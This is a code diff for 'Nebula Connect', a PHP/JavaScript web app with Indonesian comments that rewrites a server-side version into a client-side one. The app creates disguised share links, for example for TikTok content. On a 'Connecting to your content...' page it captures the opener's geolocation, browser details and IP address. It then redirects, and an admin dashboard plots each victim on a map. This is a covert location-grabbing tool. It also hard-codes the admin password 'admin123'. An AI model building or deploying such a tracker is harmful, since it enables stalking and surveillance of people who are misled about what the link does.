@@ -1,123 +1,3 @@
-<?php
-// Inisialisasi sesi untuk login admin
-session_start();
-
-// Direktori untuk menyimpan file JSON
-$data_dir = 'data';
-if (!file_exists($data_dir)) {
-    mkdir($data_dir, 0755, true);
-}
-
-$links_file = $data_dir . '/links.json';
-$tracking_file = $data_dir . '/tracking.json';
-
-// Inisialisasi file jika belum ada
-if (!file_exists($links_file)) {
-    file_put_contents($links_file, json_encode([]));
-}
-if (!file_exists($tracking_file)) {
-    file_put_contents($tracking_file, json_encode([]));
-}
-
-// Fungsi untuk membuat ID unik
-function generateUniqueID() {
-    return substr(md5(uniqid(mt_rand(), true)), 0, 10);
-}
-
-// Handler untuk pembuatan link baru
-if (isset($_POST['create_link'])) {
-    $original_link = trim($_POST['original_link']);
-    
-    if (!empty($original_link)) {
-        $links = json_decode(file_get_contents($links_file), true);
-        
-        $link_id = generateUniqueID();
-        $tracking_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://") . 
-                        $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/index.php?id=" . $link_id;
-        
-        $links[$link_id] = [
-            'original_link' => $original_link,
-            'created_at' => date('Y-m-d H:i:s'),
-            'tracking_link' => $tracking_link,
-            'status' => 'Belum dibuka'
-        ];
-        
-        file_put_contents($links_file, json_encode($links, JSON_PRETTY_PRINT));
-        
-        $success_message = "Link berhasil dibuat!";
-        $new_link = $tracking_link;
-    }
-}
-
-// Handler untuk halaman tracking
-if (isset($_GET['id'])) {
-    $link_id = $_GET['id'];
-    $links = json_decode(file_get_contents($links_file), true);
-    
-    if (isset($links[$link_id])) {
-        $original_link = $links[$link_id]['original_link'];
-        $links[$link_id]['status'] = 'Sudah dibuka';
-        file_put_contents($links_file, json_encode($links, JSON_PRETTY_PRINT));
-        
-        // Siapkan halaman untuk menyimpan data lokasi
-        $tracking_page = true;
-    } else {
-        header('Location: index.php');
-        exit;
-    }
-}
-
-// Handler untuk menyimpan data tracking
-if (isset($_POST['save_tracking'])) {
-    $data = $_POST;
-    $tracking_data = json_decode(file_get_contents($tracking_file), true);
-    
-    if (!isset($tracking_data[$data['link_id']])) {
-        $tracking_data[$data['link_id']] = [];
-    }
-    
-    $tracking_entry = [
-        'latitude' => $data['latitude'],
-        'longitude' => $data['longitude'],
-        'timestamp' => date('Y-m-d H:i:s'),
-        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
-        'ip_address' => $_SERVER['REMOTE_ADDR']
-    ];
-    
-    array_push($tracking_data[$data['link_id']], $tracking_entry);
-    file_put_contents($tracking_file, json_encode($tracking_data, JSON_PRETTY_PRINT));
-    
-    header('Content-Type: application/json');
-    echo json_encode(['success' => true]);
-    exit;
-}
-
-// Login admin
-$admin_username = 'admin';
-$admin_password = 'admin123'; // Ganti dengan password yang lebih kuat di implementasi nyata
-
-if (isset($_POST['admin_login'])) {
-    if ($_POST['username'] === $admin_username && $_POST['password'] === $admin_password) {
-        $_SESSION['admin_logged_in'] = true;
-    } else {
-        $login_error = "Username atau password salah!";
-    }
-}
-
-// Logout admin
-if (isset($_GET['logout'])) {
-    unset($_SESSION['admin_logged_in']);
-    header('Location: index.php');
-    exit;
-}
-
-// Cek apakah admin sudah login
-$admin_logged_in = isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;
-
-// Jika halaman admin diminta
-$show_admin = isset($_GET['admin']) && $_GET['admin'] === 'dashboard';
-
-?>
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -126,10 +6,8 @@ $show_admin = isset($_GET['admin']) && $_GET['admin'] === 'dashboard';
     <title>Nebula Connect</title>
     <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
-    <?php if (isset($tracking_page) || ($show_admin && $admin_logged_in)): ?>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
-    <?php endif; ?>
     <style>
         :root {
             --primary-color: #00f7ff;
@@ -673,240 +551,467 @@ $show_admin = isset($_GET['admin']) && $_GET['admin'] === 'dashboard';
     </style>
 </head>
 <body>
-    <nav>
-        <a href="index.php" class="logo"><i class="fas fa-globe-asia"></i> Nebula Connect</a>
-        <div class="nav-links">
-            <a href="index.php">Home</a>
-            <?php if (!$admin_logged_in): ?>
-                <a href="index.php?admin=login">Admin</a>
-            <?php else: ?>
-                <a href="index.php?admin=dashboard">Dashboard</a>
-                <a href="index.php?logout=true">Logout</a>
-            <?php endif; ?>
-        </div>
-    </nav>
-
-    <?php if (isset($tracking_page)): ?>
-    <!-- Halaman Redirect dengan Pelacakan -->
-    <div class="loading-overlay">
-        <div class="loader"></div>
-        <div class="loading-text">Connecting to your content...</div>
-    </div>
+    <div id="root"></div>
     
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Minta izin lokasi dan kirim ke server
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
+        // Utility functions
+        function generateUniqueID() {
+            return Math.random().toString(36).substring(2, 12);
+        }
+        
+        function formatDate() {
+            const now = new Date();
+            return now.toISOString().slice(0, 19).replace('T', ' ');
+        }
+        
+        // Local storage functions
+        function getLinks() {
+            const links = localStorage.getItem('nebula_links');
+            return links ? JSON.parse(links) : {};
+        }
+        
+        function saveLinks(links) {
+            localStorage.setItem('nebula_links', JSON.stringify(links));
+        }
+        
+        function getTrackingData() {
+            const data = localStorage.getItem('nebula_tracking');
+            return data ? JSON.parse(data) : {};
+        }
+        
+        function saveTrackingData(data) {
+            localStorage.setItem('nebula_tracking', JSON.stringify(data));
+        }
+        
+        // Authentication functions
+        function isAdminLoggedIn() {
+            return localStorage.getItem('admin_logged_in') === 'true';
+        }
+        
+        function adminLogin(username, password) {
+            // Hard-coded credentials (in a real app, never do this!)
+            if (username === 'admin' && password === 'admin123') {
+                localStorage.setItem('admin_logged_in', 'true');
+                return true;
+            }
+            return false;
+        }
+        
+        function adminLogout() {
+            localStorage.removeItem('admin_logged_in');
+        }
+        
+        // URL parameter functions
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams.entries()) {
+                params[key] = value;
+            }
+            
+            return params;
+        }
+        
+        // Render functions for different views
+        function renderNav() {
+            const isAdmin = isAdminLoggedIn();
+            
+            return `
+            <nav>
+                <a href="#" onclick="navigateTo('home'); return false;" class="logo"><i class="fas fa-globe-asia"></i> Nebula Connect</a>
+                <div class="nav-links">
+                    <a href="#" onclick="navigateTo('home'); return false;">Home</a>
+                    ${!isAdmin 
+                        ? `<a href="#" onclick="navigateTo('admin-login'); return false;">Admin</a>` 
+                        : `<a href="#" onclick="navigateTo('admin-dashboard'); return false;">Dashboard</a>
+                           <a href="#" onclick="handleLogout(); return false;">Logout</a>`
+                    }
+                </div>
+            </nav>
+            `;
+        }
+        
+        function renderFooter() {
+            return `
+            <footer class="footer">
+                <p>&copy; 2025 Nebula Connect | Next-Generation Link Solutions</p>
+            </footer>
+            `;
+        }
+        
+        function renderHome(successMessage = null, newLink = null) {
+            return `
+            <div class="container">
+                <div class="hero">
+                    <h1>Nebula Connect</h1>
+                    <p>Share your content across platforms with enhanced analytics and advanced features.</p>
+                </div>
+                
+                <div class="card">
+                    ${successMessage ? `
+                    <div class="alert alert-success">
+                        ${successMessage}
+                    </div>
+                    ` : ''}
                     
-                    // Kirim data ke server
-                    fetch('index.php', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                        },
-                        body: 'save_tracking=1&link_id=<?php echo $link_id; ?>&latitude=' + latitude + '&longitude=' + longitude
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        // Redirect setelah data tersimpan
-                        setTimeout(function() {
-                            window.location.href = "<?php echo htmlspecialchars($original_link); ?>";
-                        }, 2000);
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        // Redirect anyway after a timeout
-                        setTimeout(function() {
-                            window.location.href = "<?php echo htmlspecialchars($original_link); ?>";
-                        }, 2000);
-                    });
-                }, function(error) {
-                    console.error('Error getting location:', error);
-                    // Redirect anyway if user denies location access
-                    setTimeout(function() {
-                        window.location.href = "<?php echo htmlspecialchars($original_link); ?>";
-                    }, 2000);
-                });
+                    <div class="form-group">
+                        <label for="original_link">Enter your link</label>
+                        <input type="text" id="original_link" name="original_link" placeholder="https://tiktok.com/..." required>
+                    </div>
+                    
+                    <button onclick="createLink()">Generate Link <i class="fas fa-arrow-right"></i></button>
+                    
+                    ${newLink ? `
+                    <div class="result-link">
+                        <p>Your custom link is ready:</p>
+                        <div class="link-display">${newLink}</div>
+                        <button class="copy-btn" onclick="copyToClipboard('${newLink}')">
+                            <i class="fas fa-copy"></i> Copy Link
+                        </button>
+                    </div>
+                    ` : ''}
+                </div>
+                
+                <div class="card">
+                    <h2>Why use Nebula Connect?</h2>
+                    <p>Nebula Connect provides elegant solutions for sharing content across different platforms, offering enhanced analytics and ensuring your audience has the best experience when accessing your shared links.</p>
+                </div>
+            </div>
+            `;
+        }
+        
+        function renderAdminLogin(error = null) {
+            return `
+            <div class="container">
+                <div class="hero">
+                    <h1>Admin Login</h1>
+                    <p>Access your dashboard to monitor connections</p>
+                </div>
+                
+                <div class="card">
+                    ${error ? `
+                    <div class="alert alert-error">
+                        ${error}
+                    </div>
+                    ` : ''}
+                    
+                    <div class="form-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username" name="username" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    
+                    <button onclick="handleAdminLogin()">Login</button>
+                </div>
+            </div>
+            `;
+        }
+        
+        function renderAdminDashboard() {
+            const links = getLinks();
+            const trackingData = getTrackingData();
+            
+            let linkListHTML = '';
+            
+            if (Object.keys(links).length === 0) {
+                linkListHTML = '<p>No links have been created yet.</p>';
             } else {
-                // Redirect jika geolocation tidak didukung
-                setTimeout(function() {
-                    window.location.href = "<?php echo htmlspecialchars($original_link); ?>";
+                for (const [id, linkData] of Object.entries(links)) {
+                    const statusClass = linkData.status === 'Belum dibuka' ? 'status-pending' : 'status-opened';
+                    const shortOriginalLink = linkData.original_link.length > 50 
+                        ? linkData.original_link.substring(0, 50) + '...' 
+                        : linkData.original_link;
+                    
+                    let trackingInfoHTML = '';
+                    
+                    if (linkData.status === 'Sudah dibuka' && trackingData[id]) {
+                        trackingData[id].forEach((track, index) => {
+                            trackingInfoHTML += `
+                            <div class="tracking-info">
+                                <p><strong>Access Time:</strong> ${track.timestamp}</p>
+                                <p><strong>Location:</strong> Lat: ${track.latitude}, Long: ${track.longitude}</p>
+                                <p><strong>Device:</strong> ${track.user_agent}</p>
+                                <p><strong>IP Address:</strong> ${track.ip_address}</p>
+                            </div>
+                            <div id="map-${id}-${index}" class="map-container"></div>
+                            `;
+                        });
+                    }
+                    
+                    linkListHTML += `
+                    <div class="link-item">
+                        <div class="link-header">
+                            <div class="link-title">${escapeHTML(shortOriginalLink)}</div>
+                            <span class="status ${statusClass}">${linkData.status}</span>
+                        </div>
+                        
+                        <div class="link-details">
+                            <p><strong>Tracking Link:</strong> ${escapeHTML(linkData.tracking_link)}</p>
+                            <p><strong>Created:</strong> ${linkData.created_at}</p>
+                        </div>
+                        
+                        ${trackingInfoHTML}
+                    </div>
+                    `;
+                }
+            }
+            
+            return `
+            <div class="container">
+                <div class="admin-panel">
+                    <div class="admin-sidebar">
+                        <h3>Admin Panel</h3>
+                        <ul>
+                            <li><a href="#" onclick="navigateTo('admin-dashboard'); return false;"><i class="fas fa-link"></i> Link Tracking</a></li>
+                            <li><a href="#" onclick="navigateTo('home'); return false;"><i class="fas fa-plus"></i> Create New Link</a></li>
+                            <li><a href="#" onclick="handleLogout(); return false;"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
+                        </ul>
+                    </div>
+                    
+                    <div class="admin-content">
+                        <div class="admin-header">
+                            <h2>Link Tracking Dashboard</h2>
+                        </div>
+                        
+                        <div class="link-list">
+                            ${linkListHTML}
+                        </div>
+                    </div>
+                </div>
+            </div>
+            `;
+        }
+        
+        function renderTrackingPage(linkId) {
+            return `
+            <div class="loading-overlay">
+                <div class="loader"></div>
+                <div class="loading-text">Connecting to your content...</div>
+            </div>
+            `;
+        }
+        
+        // Helper for HTML escaping
+        function escapeHTML(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        // Handler functions
+        function createLink() {
+            const originalLink = document.getElementById('original_link').value.trim();
+            
+            if (!originalLink) return;
+            
+            const links = getLinks();
+            const linkId = generateUniqueID();
+            
+            // Create tracking link
+            // For GitHub pages, we need to use the current page URL
+            const baseUrl = window.location.href.split('?')[0];
+            const trackingLink = `${baseUrl}?id=${linkId}`;
+            
+            links[linkId] = {
+                original_link: originalLink,
+                created_at: formatDate(),
+                tracking_link: trackingLink,
+                status: 'Belum dibuka'
+            };
+            
+            saveLinks(links);
+            
+            // Re-render the page with success message
+            renderView('home', {
+                successMessage: 'Link berhasil dibuat!',
+                newLink: trackingLink
+            });
+        }
+        
+        function handleAdminLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (adminLogin(username, password)) {
+                navigateTo('admin-dashboard');
+            } else {
+                renderView('admin-login', {
+                    error: 'Username atau password salah!'
+                });
+            }
+        }
+        
+        function handleLogout() {
+            adminLogout();
+            navigateTo('home');
+        }
+        
+        function handleTracking(linkId) {
+            const links = getLinks();
+            
+            if (links[linkId]) {
+                const originalLink = links[linkId].original_link;
+                links[linkId].status = 'Sudah dibuka';
+                saveLinks(links);
+                
+                // Get location data if available
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            
+                            // Save tracking data
+                            const trackingData = getTrackingData();
+                            
+                            if (!trackingData[linkId]) {
+                                trackingData[linkId] = [];
+                            }
+                            
+                            trackingData[linkId].push({
+                                latitude: latitude,
+                                longitude: longitude,
+                                timestamp: formatDate(),
+                                user_agent: navigator.userAgent,
+                                ip_address: '127.0.0.1' // This will always be localhost in client-side
+                            });
+                            
+                            saveTrackingData(trackingData);
+                            
+                            // Redirect after data is saved
+                            setTimeout(() => {
+                                window.location.href = originalLink;
+                            }, 2000);
+                        },
+                        error => {
+                            console.error('Error getting location:', error);
+                            setTimeout(() => {
+                                window.location.href = originalLink;
+                            }, 2000);
+                        }
+                    );
+                } else {
+                    setTimeout(() => {
+                        window.location.href = originalLink;
+                    }, 2000);
+                }
+            } else {
+                navigateTo('home');
+            }
+        }
+        
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                const copyBtn = document.querySelector('.copy-btn');
+                const originalText = copyBtn.innerHTML;
+                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                
+                setTimeout(() => {
+                    copyBtn.innerHTML = originalText;
                 }, 2000);
+            });
+        }
+        
+        // Navigation function
+        function navigateTo(view, params = {}) {
+            renderView(view, params);
+            
+            // Update URL without reloading the page
+            if (view === 'home') {
+                history.pushState({}, '', '/');
+            } else if (view === 'admin-login') {
+                history.pushState({}, '', '?admin=login');
+            } else if (view === 'admin-dashboard') {
+                history.pushState({}, '', '?admin=dashboard');
+            }
+        }
+        
+        // Render the appropriate view
+        function renderView(view, params = {}) {
+            const root = document.getElementById('root');
+            let content = '';
+            
+            // Always include the nav
+            content += renderNav();
+            
+            // Render the specific view
+            if (view === 'home') {
+                content += renderHome(params.successMessage, params.newLink);
+            } else if (view === 'admin-login') {
+                content += renderAdminLogin(params.error);
+            } else if (view === 'admin-dashboard') {
+                // Check if user is logged in
+                if (isAdminLoggedIn()) {
+                    content += renderAdminDashboard();
+                } else {
+                    navigateTo('admin-login');
+                    return;
+                }
+            } else if (view === 'tracking') {
+                content += renderTrackingPage(params.linkId);
+            }
+            
+            // Always include the footer
+            content += renderFooter();
+            
+            // Set the content
+            root.innerHTML = content;
+            
+            // Initialize maps if needed
+            if (view === 'admin-dashboard') {
+                initMaps();
+            }
+        }
+        
+        function initMaps() {
+            const trackingData = getTrackingData();
+            const links = getLinks();
+            
+            for (const [linkId, tracks] of Object.entries(trackingData)) {
+                if (links[linkId] && links[linkId].status === 'Sudah dibuka') {
+                    tracks.forEach((track, index) => {
+                        const mapId = `map-${linkId}-${index}`;
+                        const mapElement = document.getElementById(mapId);
+                        
+                        if (mapElement) {
+                            const map = L.map(mapId).setView([track.latitude, track.longitude], 13);
+                            
+                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                            }).addTo(map);
+                            
+                            L.marker([track.latitude, track.longitude])
+                                .addTo(map)
+                                .bindPopup(`User location at ${track.timestamp}`)
+                                .openPopup();
+                        }
+                    });
+                }
+            }
+        }
+        
+        // Initial app load
+        document.addEventListener('DOMContentLoaded', function() {
+            const params = getUrlParams();
+            
+            if (params.id) {
+                // This is a tracking link
+                renderView('tracking', { linkId: params.id });
+                handleTracking(params.id);
+            } else if (params.admin === 'login') {
+                renderView('admin-login');
+            } else if (params.admin === 'dashboard') {
+                renderView('admin-dashboard');
+            } else {
+                renderView('home');
             }
         });
-    </script>
-    <?php elseif (isset($_GET['admin']) && $_GET['admin'] === 'login' && !$admin_logged_in): ?>
-    <!-- Halaman Login Admin -->
-    <div class="container">
-        <div class="hero">
-            <h1>Admin Login</h1>
-            <p>Access your dashboard to monitor connections</p>
-        </div>
-        
-        <div class="card">
-            <?php if (isset($login_error)): ?>
-            <div class="alert alert-error">
-                <?php echo $login_error; ?>
-            </div>
-            <?php endif; ?>
-            
-            <form method="post" action="index.php?admin=login">
-                <div class="form-group">
-                    <label for="username">Username</label>
-                    <input type="text" id="username" name="username" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" required>
-                </div>
-                
-                <button type="submit" name="admin_login">Login</button>
-            </form>
-        </div>
-    </div>
-    <?php elseif ($show_admin && $admin_logged_in): ?>
-    <!-- Dashboard Admin -->
-    <div class="container">
-        <div class="admin-panel">
-            <div class="admin-sidebar">
-                <h3>Admin Panel</h3>
-                <ul>
-                    <li><a href="#"><i class="fas fa-link"></i> Link Tracking</a></li>
-                    <li><a href="index.php"><i class="fas fa-plus"></i> Create New Link</a></li>
-                    <li><a href="index.php?logout=true"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
-                </ul>
-            </div>
-            
-            <div class="admin-content">
-                <div class="admin-header">
-                    <h2>Link Tracking Dashboard</h2>
-                </div>
-                
-                <div class="link-list">
-                    <?php
-                    $links = json_decode(file_get_contents($links_file), true);
-                    $tracking_data = json_decode(file_get_contents($tracking_file), true);
-                    
-                    if (empty($links)) {
-                        echo "<p>No links have been created yet.</p>";
-                    } else {
-                        foreach ($links as $id => $link_data) {
-                            $status_class = $link_data['status'] == 'Belum dibuka' ? 'status-pending' : 'status-opened';
-                            ?>
-                            <div class="link-item">
-                                <div class="link-header">
-                                    <div class="link-title"><?php echo htmlspecialchars(substr($link_data['original_link'], 0, 50) . (strlen($link_data['original_link']) > 50 ? '...' : '')); ?></div>
-                                    <span class="status <?php echo $status_class; ?>"><?php echo $link_data['status']; ?></span>
-                                </div>
-                                
-                                <div class="link-details">
-                                    <p><strong>Tracking Link:</strong> <?php echo htmlspecialchars($link_data['tracking_link']); ?></p>
-                                    <p><strong>Created:</strong> <?php echo $link_data['created_at']; ?></p>
-                                </div>
-                                
-                                <?php if ($link_data['status'] == 'Sudah dibuka' && isset($tracking_data[$id])): ?>
-                                    <?php foreach ($tracking_data[$id] as $index => $track): ?>
-                                        <div class="tracking-info">
-                                            <p><strong>Access Time:</strong> <?php echo $track['timestamp']; ?></p>
-                                            <p><strong>Location:</strong> Lat: <?php echo $track['latitude']; ?>, Long: <?php echo $track['longitude']; ?></p>
-                                            <p><strong>Device:</strong> <?php echo htmlspecialchars($track['user_agent']); ?></p>
-                                            <p><strong>IP Address:</strong> <?php echo $track['ip_address']; ?></p>
-                                        </div>
-                                        
-                                        <div id="map-<?php echo $id . '-' . $index; ?>" class="map-container"></div>
-                                        
-                                        <script>
-                                            document.addEventListener('DOMContentLoaded', function() {
-                                                const map = L.map('map-<?php echo $id . '-' . $index; ?>').setView([<?php echo $track['latitude']; ?>, <?php echo $track['longitude']; ?>], 13);
-                                                
-                                                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                                                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
-                                                }).addTo(map);
-                                                
-                                                L.marker([<?php echo $track['latitude']; ?>, <?php echo $track['longitude']; ?>])
-                                                    .addTo(map)
-                                                    .bindPopup('User location at <?php echo $track['timestamp']; ?>')
-                                                    .openPopup();
-                                            });
-                                        </script>
-                                    <?php endforeach; ?>
-                                <?php endif; ?>
-                            </div>
-                            <?php
-                        }
-                    }
-                    ?>
-                </div>
-            </div>
-        </div>
-    </div>
-    <?php else: ?>
-    <!-- Halaman Utama -->
-    <div class="container">
-        <div class="hero">
-            <h1>Nebula Connect</h1>
-            <p>Share your content across platforms with enhanced analytics and advanced features.</p>
-        </div>
-        
-        <div class="card">
-            <?php if (isset($success_message)): ?>
-            <div class="alert alert-success">
-                <?php echo $success_message; ?>
-            </div>
-            <?php endif; ?>
-            
-            <form method="post" action="index.php">
-                <div class="form-group">
-                    <label for="original_link">Enter your link</label>
-                    <input type="text" id="original_link" name="original_link" placeholder="https://tiktok.com/..." required>
-                </div>
-                
-                <button type="submit" name="create_link">Generate Link <i class="fas fa-arrow-right"></i></button>
-            </form>
-            
-            <?php if (isset($new_link)): ?>
-            <div class="result-link">
-                <p>Your custom link is ready:</p>
-                <div class="link-display"><?php echo htmlspecialchars($new_link); ?></div>
-                <button class="copy-btn" onclick="copyToClipboard('<?php echo $new_link; ?>')">
-                    <i class="fas fa-copy"></i> Copy Link
-                </button>
-            </div>
-            <?php endif; ?>
-        </div>
-        
-        <div class="card">
-            <h2>Why use Nebula Connect?</h2>
-            <p>Nebula Connect provides elegant solutions for sharing content across different platforms, offering enhanced analytics and ensuring your audience has the best experience when accessing your shared links.</p>
-        </div>
-    </div>
-    <?php endif; ?>
-    
-    <footer class="footer">
-        <p>&copy; 2025 Nebula Connect | Next-Generation Link Solutions</p>
-    </footer>
-    
-    <script>
-        function copyToClipboard(text) {
-            const tempInput = document.createElement('input');
-            tempInput.value = text;
-            document.body.appendChild(tempInput);
-            tempInput.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempInput);
-            
-            const copyBtn = document.querySelector('.copy-btn');
-            const originalText = copyBtn.innerHTML;
-            copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-            
-            setTimeout(() => {
-                copyBtn.innerHTML = originalText;
-            }, 2000);
-        }
     </script>
 </body>
 </html>
